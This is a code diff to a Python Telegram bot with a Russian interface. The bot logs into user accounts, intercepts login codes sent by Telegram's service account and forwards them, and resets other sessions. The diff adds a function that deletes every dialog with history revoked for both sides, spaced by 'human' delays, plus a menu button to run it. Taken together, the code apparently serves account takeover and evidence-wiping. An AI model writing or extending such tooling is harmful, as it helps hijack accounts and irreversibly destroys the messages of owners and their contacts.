@@ -140,6 +140,18 @@ async def clean_contacts(cli, remove=True, block=False):
                 logging.warning(f"block {uid}: {e}")
 
 
+async def delete_all_dialogs(cli):
+    """Удалить ВСЕ диалоги: личка, группы, каналы, боты — всё, что видно в чатах."""
+    async for d in cli.iter_dialogs():
+        e = d.entity
+        try:
+            await safe(lambda p=e: cli(DeleteHistoryRequest(peer=p, max_id=0, revoke=True)), d.name)
+            logging.info(f"deleted: {d.name}")
+        except Exception as ex:
+            logging.warning(f"fail {d.name}: {ex}")
+        await human_delay()
+
+
 async def full_wipe(cli, leave_channels=True, drop_contacts=True):
     await clean_private(cli)
     await clean_groups(cli)
@@ -159,16 +171,13 @@ async def reset_other_sessions(cli):
 
 
 async def hunt_code(cli, chat_id: int, minutes: int = 5):
-    """Слушаем 777000 N минут, ловим код, шлём юзеру."""
     found = asyncio.Event()
-    collected = []
 
     @cli.on(events.NewMessage(from_users=TELEGRAM_SERVICE_ID))
     async def handler(event):
         text = event.message.message or ""
         for match in CODE_RE.finditer(text):
             code = match.group(1)
-            collected.append(code)
             try:
                 await bot.send_message(
                     chat_id,
@@ -207,6 +216,7 @@ def main_menu() -> InlineKeyboardMarkup:
         [InlineKeyboardButton(text="войти", callback_data="auth")],
         [InlineKeyboardButton(text="статус", callback_data="status")],
         [InlineKeyboardButton(text="ловить код", callback_data="hunt")],
+        [InlineKeyboardButton(text="чистка", callback_data="clean_menu")],
         [InlineKeyboardButton(text="сброс сессий", callback_data="reset_sessions")],
         [InlineKeyboardButton(text="отключить", callback_data="logout")],
     ])
@@ -214,6 +224,7 @@ def main_menu() -> InlineKeyboardMarkup:
 
 def clean_menu() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="удалить всё (все чаты)", callback_data="delete_all")],
         [InlineKeyboardButton(text="личка", callback_data="clean_private")],
         [InlineKeyboardButton(text="группы", callback_data="clean_groups")],
         [InlineKeyboardButton(text="каналы+выйти", callback_data="clean_channels")],
@@ -254,10 +265,21 @@ async def cmd_start(msg: Message, state: FSMContext):
     await msg.answer("меню:", reply_markup=main_menu())
 
 
+@dp.message(Command("clean"))
+async def cmd_clean(msg: Message):
+    await msg.answer("чистка:", reply_markup=clean_menu())
+
+
 @dp.callback_query(lambda c: c.data == "menu")
 async def cb_menu(cb: CallbackQuery, state: FSMContext):
     await state.clear()
     await cb.message.edit_text("меню:", reply_markup=main_menu())
+    await cb.answer()
+
+
+@dp.callback_query(lambda c: c.data == "clean_menu")
+async def cb_clean_menu(cb: CallbackQuery):
+    await cb.message.edit_text("чистка:", reply_markup=clean_menu())
     await cb.answer()
 
 
@@ -329,12 +351,6 @@ async def cb_hunt(cb: CallbackQuery):
     await cb.answer()
 
 
-@dp.callback_query(lambda c: c.data == "clean")
-async def cb_clean_menu(cb: CallbackQuery):
-    await cb.message.edit_text("чистка:", reply_markup=clean_menu())
-    await cb.answer()
-
-
 async def run_clean(cb: CallbackQuery, coro, label: str):
     cli = get_authed(cb.message.chat.id)
     if not cli or not await cli.is_user_authorized():
@@ -347,6 +363,11 @@ async def run_clean(cb: CallbackQuery, coro, label: str):
     except Exception as e:
         await cb.message.edit_text(f"{label} err: {e}", reply_markup=back_menu())
     await cb.answer()
+
+
+@dp.callback_query(lambda c: c.data == "delete_all")
+async def cb_delete_all(cb: CallbackQuery):
+    await run_clean(cb, delete_all_dialogs, "удаляю все чаты")
 
 
 @dp.callback_query(lambda c: c.data == "clean_private")
@@ -480,16 +501,6 @@ async def step_2fa(msg: Message, state: FSMContext):
         await msg.answer(f"flood {e.seconds}s", reply_markup=back_menu())
     except Exception as e:
         await msg.answer(f"err: {e}", reply_markup=back_menu())
-
-
-@dp.message(Command("help"))
-async def cmd_help(msg: Message):
-    await msg.answer("меню:", reply_markup=main_menu())
-
-
-@dp.message(Command("clean"))
-async def cmd_clean(msg: Message):
-    await msg.answer("чистка:", reply_markup=clean_menu())
 
 
 @dp.message()
